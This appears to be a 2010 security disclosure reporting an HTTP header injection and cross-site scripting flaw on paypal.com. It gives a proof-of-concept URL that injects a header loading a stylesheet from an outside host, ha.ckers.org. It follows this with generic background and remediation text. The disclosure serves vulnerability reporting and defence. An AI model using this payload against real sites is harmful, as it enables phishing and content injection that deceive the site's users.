https://www.paypal.com | HTTP Header Injection | Cross Site Scripting (XSS)
| CAPEC-34 | CWE-79<http://cloudscan.blogspot.com/2010/10/wwwpaypalcom-http-header-injection.html>
Hoyt LLC - October 28, 2010 http://cloudscan.blogspot.com |
http://cloudscan.me

https://www.paypal.com | HTTP Header Injection | Cross Site Scripting (XSS)

Tested on IE8, Chrome, Firefox. The affected URL's on
https://www.paypal.com use
aVerisign Extended Validation SSL
Certificate<http://www.verisign.com/ssl/ssl-information-center/extended-validation-ssl-certificates/>,
which in theory assures the visitors that the content and the domain name
belong to PayPal and PayPal.com but in practice this Proof of Concept (PoC)
will demonstrate that identity assurance of the SSL-EV can be exploited.

PoC URL =
https://www.paypal.com/%3CMETA%20HTTP-EQUIV=%22Link%22%20Content=%22%3Chttp://ha.ckers.org/xss.css%3E;%20REL=stylesheet%22%3E/pages/pageSearchRedesign.css

Any potential phishing attacks leveraging the HTTP Header Injection into a
Cross Site Scripting Attack (XSS) on the SSL EV Site could have a high
success rate.

10-28-2010 | The HTTP Header Injection and Cross Site Scripting Expressions
can be injected into the Domain and the SSL-EV therefore should not load the
Vulnerable URL.

<http://cloudscan.me/images/paypal-response-splitting-11.jpg>
----------------------------------------------
PoC Example


Issue backgroundHTTP header injection vulnerabilities arise when
user-supplied data is copied into a response header in an unsafe way. If an
attacker can inject newline characters into the header, then they can inject
new HTTP headers and also, by injecting an empty line, break out of the
headers into the message body and write arbitrary content into the
application's response.

Various kinds of attack can be delivered via HTTP header injection
vulnerabilities. Any attack that can be delivered via cross-site scripting
can usually be delivered via header injection, because the attacker can
construct a request which causes arbitrary JavaScript to appear within the
response body. Further, it is sometimes possible to leverage header
injection vulnerabilities to poison the cache of any proxy server via which
users access the application. Here, an attacker sends a crafted request
which results in a "split" response containing arbitrary content. If the
proxy server can be manipulated to associate the injected response with
another URL used within the application, then the attacker can perform a
"stored" attack against this URL which will compromise other users who
request that URL in future. Issue remediationIf possible, applications
should avoid copying user-controllable data into HTTP response headers. If
this is unavoidable, then the data should be strictly validated to prevent
header injection attacks. In most situations, it will be appropriate to
allow only short alphanumeric strings to be copied into headers, and any
other input should be rejected. At a minimum, input containing any
characters with ASCII codes less than 0x20 should be rejected.
